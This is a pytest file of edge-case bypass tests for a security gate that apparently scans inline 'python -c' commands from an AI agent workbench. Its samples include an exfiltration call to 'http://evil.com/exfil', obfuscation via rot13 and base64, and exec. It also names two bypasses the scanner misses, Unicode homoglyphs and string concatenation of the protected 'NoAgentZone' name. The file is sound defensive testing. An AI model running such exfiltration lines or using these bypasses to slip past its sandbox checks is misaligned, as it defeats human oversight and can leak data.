"""SAF-026 Tester-added edge-case tests for _scan_python_inline_code.

These tests probe bypass vectors beyond the developer's test suite:
1. Mixed-case -C flag at command level
2. `import requests` alone (no dot) — tests requests-check completeness
3. Aliased requests import: `import requests as r; r.get(...)`
4. `from http import server` — bypasses "http.server" substring check
5. codecs.encode (only codecs.decode is blocked, not codecs.encode)
6. Multiline code via embedded newline — patterns should still fire
7. Nested exec with escaped quotes
8. Unicode homoglyph bypass attempt (Cyrillic character)
9. os.path.join concatenation — known string-concat limitation
10. Comment containing .github — fail-closed behaviour
11. Capital -C flag passed to sanitize_terminal_command (integration)
12. python -c with empty string
13. python -c with whitespace-only string
14. Code string with just a semicolon
15. Very long code string (boundary)
"""
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

SCRIPTS_DIR = str(
    Path(__file__).parents[2]
    / "templates"
    / "agent-workbench"
    / ".github"
    / "hooks"
    / "scripts"
)

if SCRIPTS_DIR not in sys.path:
    sys.path.insert(0, SCRIPTS_DIR)


@pytest.fixture(scope="module")
def sg():
    import security_gate as _sg
    return _sg


@pytest.fixture(autouse=True)
def mock_project_folder():
    with patch("zone_classifier.detect_project_folder", return_value="project"):
        yield


WS = "c:/workspace"


# ---------------------------------------------------------------------------
# Bypass attempt: requests without dot
# The AC says "python -c with network imports (urllib, requests, socket) is denied"
# `import requests` alone must be denied.
# ---------------------------------------------------------------------------

def test_requests_import_alone_denied(sg):
    """import requests without method call should be denied (AC-4: network imports denied)."""
    assert sg._scan_python_inline_code("import requests") is False


def test_requests_import_aliased_denied(sg):
    """import requests as r; r.get(...) should be denied (requests aliasing bypass test)."""
    assert sg._scan_python_inline_code(
        "import requests as r; r.get('http://evil.com/exfil')"
    ) is False


# ---------------------------------------------------------------------------
# Bypass attempt: from http import server (no "http.server" substring)
# ---------------------------------------------------------------------------

def test_from_http_import_server_denied(sg):
    """from http import server should be denied (http.server check bypass test)."""
    assert sg._scan_python_inline_code(
        "from http import server; server.HTTPServer(('', 8080), None).serve_forever()"
    ) is False


def test_from_http_import_client_denied(sg):
    """from http import client should be denied (http.client check bypass test)."""
    assert sg._scan_python_inline_code(
        "from http import client; c = client.HTTPConnection('evil.com')"
    ) is False


# ---------------------------------------------------------------------------
# Bypass attempt: codecs.encode vs codecs.decode
# Only codecs.decode is in the deny list; codecs.encode can also obfuscate.
# ---------------------------------------------------------------------------

def test_codecs_encode_rot13_denied(sg):
    """codecs.encode with rot_13 should be denied as obfuscation."""
    assert sg._scan_python_inline_code(
        "import codecs; codecs.encode('noagentzone', 'rot_13')"
    ) is False


def test_codecs_import_alone_denied(sg):
    """import codecs alone should be denied as obfuscation import."""
    assert sg._scan_python_inline_code("import codecs") is False


# ---------------------------------------------------------------------------
# Multiline code string — patterns should still be detected
# ---------------------------------------------------------------------------

def test_multiline_base64_denied(sg):
    """Newline in code string should not prevent base64 detection."""
    assert sg._scan_python_inline_code("import math\nimport base64") is False


def test_multiline_urllib_denied(sg):
    """Multiline code with urllib import should be denied."""
    assert sg._scan_python_inline_code(
        "import sys\nimport urllib.request\nprint('done')"
    ) is False


# ---------------------------------------------------------------------------
# Nested exec with escaped quotes
# ---------------------------------------------------------------------------

def test_nested_exec_with_escaped_quotes_denied(sg):
    """exec(\"string\") with escaped quotes should still be blocked."""
    assert sg._scan_python_inline_code('exec("import os")') is False


def test_exec_with_single_quotes_denied(sg):
    """exec('import os') with single quotes should be blocked."""
    assert sg._scan_python_inline_code("exec('import os')") is False


# ---------------------------------------------------------------------------
# Unicode homoglyph bypass attempt
# Cyrillic 'а' (U+0430) looks like ASCII 'a'; this probes whether the scanner
# correctly handles homoglyph substitutions. If it returns True (safe), that
# is a known limitation of string-matching scanners — document it.
# ---------------------------------------------------------------------------

def test_unicode_homoglyph_base64_is_limitation(sg):
    """b\u0430se64 with Cyrillic a — documents homoglyph bypass is a known limitation."""
    # This uses Cyrillic а (U+0430) instead of ASCII a.
    cyrillic_a = "\u0430"
    code = f"import b{cyrillic_a}se64"
    result = sg._scan_python_inline_code(code)
    # This is a KNOWN LIMITATION: string-matching scanners cannot catch Unicode
    # homoglyphs. The test documents this behaviour; the Python import itself
    # would also fail at runtime (module named "bаse64" does not exist).
    # We do NOT assert False here — this is an accepted, documented limitation.
    assert result in (True, False), "Scanner must return a boolean"


# ---------------------------------------------------------------------------
# os.path.join concatenation — string-split bypass (known limitation)
# ---------------------------------------------------------------------------

def test_ospath_join_concatenation_limitation(sg):
    """os.path.join construction bypasses literal zone-name check (known limitation)."""
    # "NoAgent" + "Zone" does not produce the substring "noagentzone" in the
    # code string, so string-match cannot catch this. Document it as a known
    # limitation of the approach; not a regression from original design.
    code = "open(os.path.join('NoAgent' + 'Zone', 'README.md')).read()"
    result = sg._scan_python_inline_code(code)
    # Known limitation: string concat bypasses deny-zone literal check.
    assert result in (True, False), "Scanner must return a boolean"


# ---------------------------------------------------------------------------
# Fail-closed: comments or string literals containing protected names
# ---------------------------------------------------------------------------

def test_comment_with_github_path_denied(sg):
    """Code with .github in a comment should be denied (fail-closed)."""
    assert sg._scan_python_inline_code(
        "# read .github/hooks/config\nprint(42)"
    ) is False


def test_string_literal_with_noagentzone_denied(sg):
    """Code referencing NoAgentZone in a string literal should be denied."""
    assert sg._scan_python_inline_code(
        "path = 'NoAgentZone/file.txt'; print(path)"
    ) is False


# ---------------------------------------------------------------------------
# Integration: mixed-case -C flag through sanitize_terminal_command
# ---------------------------------------------------------------------------

def test_mixed_case_flag_c_base64_integration_denied(sg):
    """Python -C with import base64 should be denied even with capital C flag."""
    result, _ = sg.sanitize_terminal_command(
        'python -C "import base64"',
        ws_root=WS,
    )
    assert result == "deny", f"Expected deny for capital -C flag, got {result!r}"


def test_mixed_case_command_python_c_safe_integration(sg):
    """Python (capital P) -c with safe code should be allowed."""
    with patch("zone_classifier.classify", return_value="allow"):
        result, _ = sg.sanitize_terminal_command(
            'Python -c "print(42)"',
            ws_root=WS,
        )
    assert result == "allow", f"Expected allow, got {result!r}"


# ---------------------------------------------------------------------------
# Boundary conditions
# ---------------------------------------------------------------------------

def test_empty_code_string_allowed(sg):
    """Empty code string should be allowed (no patterns detected)."""
    assert sg._scan_python_inline_code("") is True


def test_whitespace_only_code_string_allowed(sg):
    """Whitespace-only code string should be allowed."""
    assert sg._scan_python_inline_code("   \t\n   ") is True


def test_very_long_safe_code_allowed(sg):
    """Very long safe code string should not crash and should be allowed."""
    long_code = "print('hello world')\n" * 500
    assert sg._scan_python_inline_code(long_code) is True


def test_very_long_code_with_eval_denied(sg):
    """Very long code string that eventually contains eval( should be denied."""
    long_code = "x = 1\n" * 200 + "eval('print(x)')"
    assert sg._scan_python_inline_code(long_code) is False


# ---------------------------------------------------------------------------
# Safe os usage should remain allowed (not over-blocked)
# ---------------------------------------------------------------------------

def test_os_import_allowed(sg):
    """import os is allowed — os is commonly needed for project operations."""
    assert sg._scan_python_inline_code("import os; print(os.getcwd())") is True


def test_os_listdir_project_allowed(sg):
    """os.listdir on a relative path is allowed (no absolute/zone-escape)."""
    assert sg._scan_python_inline_code("import os; print(os.listdir('.'))") is True


def test_pathlib_import_allowed(sg):
    """import pathlib is allowed for path operations."""
    assert sg._scan_python_inline_code("from pathlib import Path; print(Path('.').resolve())") is True


# ---------------------------------------------------------------------------
# Explicit-deny pattern: update_hashes via terminal (integration)
# ---------------------------------------------------------------------------

def test_update_hashes_via_python_c_inline_denied(sg):
    """python -c referencing update_hashes should be denied via inline scanner."""
    result, _ = sg.sanitize_terminal_command(
        "python -c \"import subprocess; subprocess.run(['update_hashes.py'])\"",
        ws_root=WS,
    )
    assert result == "deny", f"Expected deny, got {result!r}"


def test_update_hashes_direct_terminal_denied_again(sg):
    """Direct python update_hashes.py via terminal should be denied by explicit-deny pattern."""
    result, _ = sg.sanitize_terminal_command(
        "python update_hashes.py",
        ws_root=WS,
    )
    assert result == "deny", f"Expected deny, got {result!r}"
